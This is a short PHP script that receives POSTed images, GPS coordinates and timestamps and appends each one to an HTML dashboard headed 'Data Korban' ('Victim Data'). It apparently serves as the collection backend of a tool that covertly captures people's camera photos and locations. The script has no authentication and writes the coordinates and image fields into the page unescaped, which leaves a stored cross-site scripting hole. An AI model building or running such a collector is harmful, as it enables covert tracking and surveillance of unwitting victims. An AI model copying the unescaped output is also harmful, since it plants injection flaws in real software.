<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

$data = json_decode(file_get_contents('php://input'), true);
if (!$data || !isset($data['image']) || !isset($data['lat'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid data']);
    exit;
}

// Simpan ke dashboard.html (append sebagai entri baru)
$entry = "
<div style='border:1px solid #ccc; margin:10px; padding:10px;'>
    <h3>Data Korban - " . htmlspecialchars($data['timestamp']) . "</h3>
    <p>Lokasi: " . $data['lat'] . ", " . $data['lng'] . "</p>
    <img src='" . $data['image'] . "' style='max-width:300px;' />
</div>";

file_put_contents('dashboard.html', $entry, FILE_APPEND | LOCK_EX);

echo json_encode(['success' => true]);
?>